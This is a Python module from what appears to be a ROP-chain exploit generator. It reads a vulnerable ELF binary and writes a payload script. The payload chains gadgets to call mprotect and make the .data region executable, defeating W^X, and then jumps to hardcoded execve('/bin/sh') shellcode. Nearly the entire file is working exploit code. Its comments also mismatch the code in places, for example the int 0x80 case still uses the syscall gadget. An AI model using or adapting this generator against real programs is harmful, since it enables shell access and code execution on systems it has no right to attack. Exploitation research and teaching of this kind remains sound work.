from elftools.elf.elffile import ELFFile
import capstone
import struct
import sys

import general
import print_pretty
import categorize
import get_gadgets
import chain


# Takes in 1-instruction GadgetList (general.ALLGADGETS) and name of the vulnerable executable
# This is the driver routine which will chain the rop-gadgets and get execve shellcode
def mprotectROPChain(GadgetList, vulnExecutable): 

    print("\n\n-->Chaining gadgets to execute mprotect system call")
    print("-->Is called to make .data section executable")
    print("-->Defeating W^X")

    fd = open(vulnExecutable, "rb")
    elffile = ELFFile(fd)
    data_section = ".data"
    section = elffile.get_section_by_name(data_section)
    
    # We need .data section's details because we have to write "/bin//sh" into it. 
    data_section_addr = section["sh_addr"]
    data_section_size = section["sh_size"]

    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    intList = categorize.checkIfIntPresent(GadgetList)

    if len(intList) == 0 and len(syscallList) == 0: 
        print("No int 0x80, no syscall, no ROP")
        print("Exiting tool :(")
        sys.exit()
    
    # There are 2 choices here: 
    
    # Choice - 1
    # if syscall is found, 
        # rax <- 59
        # rdi <- Address of "/bin/sh"
        # rsi <- 0
        # rdx <- 0
        # syscall
    if len(syscallList) > 0: 
        case2(GadgetList, data_section_addr)
        sys.exit()

    # Choice - 2
    # if int 0x80 is found, 
        # rax <- 11
        # rbx <- Address of "/bin/sh"
        # rcx <- 0
        # rdx <- 0
        # int 0x80
    elif len(intList) > 0: 
        case1(GadgetList, data_section_addr)
        sys.exit()

    print("--> No syscall / int 0x80 found => ROP Chaining failed")
    sys.exit()



# If "int 0x80" instruction is found: 

# These are the steps to be followed. 
# 
# STAGE-1: 
# 
# 1. rax <- 125(system call number of mprotect in 32-bit Linux)
# 2. Write required shellcode into .data section
# 3. rdi <- writable section's starting address(look at mprotect's manpage to understand why this is done)
# 4. rsi <- length of region which has to be made executable - default: 4096 * 3
# 5. rdx <- 7(PROT_READ | PROT_WRITE | PROT_EXEC)
# 6. Execute "int 0x80; ret" gadget
#
# At this point, .data section is executable(if mprotect is successful)
# 
# STAGE-2: 
#
# 1. The "ret" of "syscall; ret" will give control to .data section - where traditional shellcode is present.
# 2. Execute traditional shellcode!
#
# W^X defeated!
#
# Observation: This case is second priority. 
# Reason: rax <- 125 => Payload might be really huge. 
# This is a basic tool with no optimizations. At this point, the tool generates really huge payload for this.
# Finding "int 0x80; ret" is hard. 


def case1(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("mprotectROPChain.py", "w")
    chain.writeHeader(fd)
    
    # Step-2: Writing traditional shellcode into .data section
    shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    
    chain.WriteStuffIntoMemory(shellcode, data_section_addr, fd)
    
    # System call number of mprotect = 10
    # Step-1: rax <- 10
    chain.LoadConstIntoReg(GadgetList, "rax", 10, fd)

	# Step-3: rdi <- "Address of /bin//sh" - .data section's address
    # chain.LoadConstIntoReg(GadgetList, "rdi", data_section_addr, fd)
    # chain.LoadConstIntoReg(GadgetList, "rdi", 0x6c9000, fd)

    # 0x6c9000 is where Writable section starts.
    # 4096 bytes from here are made executable
    chain.LoadConstIntoReg(GadgetList, "rdi", 0x6c9000, fd)
	# Step-4: rsi <- 100
    # Make the first 100 bytes of .data executable
    # chain.LoadConstIntoReg(GadgetList, "rsi", 100, fd)
    chain.LoadConstIntoReg(GadgetList, "rsi", 4096 * 3, fd)

    # Step-5: rdx <- 7
    # 7 - PROT_READ | PROT_WRITE | PROT_EXEC
    # The permissions to execute!
    chain.LoadConstIntoReg(GadgetList, "rdx", 7, fd)


    # Get syscall
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")

    fd.write("payload += struct.pack('<Q', ")
    # fd.write(hex(int(data_section_addr)))
    fd.write(hex(data_section_addr))
    fd.write(")")
    fd.write("\t\t# Address of .data section where shellcode is present")
    fd.write("\n\t")
    
    chain.writeFooter(fd)
    print("-->Written the complete payload in mprotectROPChain.py")
    print("-->Chaining successful!")




# If "syscall" instruction is found: 

# These are the steps to be followed. 
# 
# STAGE-1: 
# 
# 1. rax <- 10
# 2. Write required shellcode into .data section
# 3. rdi <- writable section's starting address(look at mprotect's manpage to understand why this is done)
# 4. rsi <- length of region which has to be made executable - default: 4096 * 3
# 5. rdx <- 7(PROT_READ | PROT_WRITE | PROT_EXEC)
# 6. Execute "syscall; ret" gadget
#
# At this point, .data section is executable(if mprotect is successful)
# 
# STAGE-2: 
#
# 1. The "ret" of "syscall; ret" will give control to .data section - where traditional shellcode is present.
# 2. Execute traditional shellcode!
#
# W^X defeated!


def case2(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("mprotectROPChain.py", "w")
    chain.writeHeader(fd)
    
    # Step-2: Writing traditional shellcode into .data section
    shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    
    # Write shellcode into .data section
    chain.WriteStuffIntoMemory(shellcode, data_section_addr, fd)
    
    # System call number of mprotect = 10
    # Step-1: rax <- 10
    chain.LoadConstIntoReg(GadgetList, "rax", 10, fd)

	# Step-3: rdi <- "Address of /bin//sh" - .data section's address
   
    # 0x6c9000 is where Writable section starts.
    chain.LoadConstIntoReg(GadgetList, "rdi", 0x6c9000, fd)
	
    # Step-4: rsi <- 100
    # Make the first 4096 * 3 bytes of Writable section executable.
    # .data section comes at an address 0x6ca980
    chain.LoadConstIntoReg(GadgetList, "rsi", 4096 * 3, fd)

    # Step-5: rdx <- 7
    # 7 - PROT_READ | PROT_WRITE | PROT_EXEC
    # The permissions to execute!
    chain.LoadConstIntoReg(GadgetList, "rdx", 7, fd)

    # At this point, .data section is executable

    # Get "syscall; ret"
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")

    # The "ret" of "syscall; ret" should jump to .data section
    # That is why, put .data section's address onto stack@
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(data_section_addr))
    fd.write(")")
    fd.write("\t\t# Address of .data section where shellcode is present")
    fd.write("\n\t")
    
    chain.writeFooter(fd)
    print("-->Written the complete payload in mprotectROPChain.py")
    print("-->Chaining successful!")
